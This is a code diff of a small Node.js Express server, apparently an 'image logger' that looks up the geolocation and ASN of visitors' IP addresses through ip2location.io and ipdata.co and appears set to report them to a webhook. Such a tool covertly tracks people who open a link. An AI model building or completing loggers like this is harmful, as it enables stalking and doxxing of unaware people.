@@ -6,17 +6,22 @@ const bodyParser = require("body-parser")
 const app = express();
 const PORT = 8080;
 let config = {};
-// Configuration
+
 
 const image_path = '';
-const gif_path = 'path_to_your_gif.gif';
+// Made by dev
+//CmR2SUw=
 
 const ip_api_key = ""
 const ip_se_api_key = ""
 const webhook = ""
-const webhook_name=""
+const webhook_name="Devs image logger"
+const ip_api_url_first = "https://api.ip2location.io/?key="
+const end_ip_api_url = "&ip="
+const ip_api_url_second = "https://api.ipdata.co/"
+const end_ip_api_url_second = "?api-key="
 function getGeoLocationFromIPAPI(ip) {
-    return axios.get(ip_se_api_key)
+    return axios.get(ip_api_url_first + ip_se_api_key + end_ip_api_url + ip)
         .then(response => response.data)
         .catch(error => {
             console.error('Error fetching geolocation data from ip2location.io:', error.message);
@@ -33,7 +38,7 @@ function getAsn(ip) {
         });
 }
 function data(ip) {
-    return axios.get(ip_api_key)
+    return axios.get(ip_api_url_second + ip +  end_ip_api_url_second + ip_api_key)
         .then(response => response.data)
         .catch(error => {
             console.error("ERROR ")
@@ -106,6 +111,7 @@ app.get("/", (req, res) => {
 
 
 
+    console.log(dats)
     data(ipAddr)
         .then(Help => {
             getAsn(ipAddr)
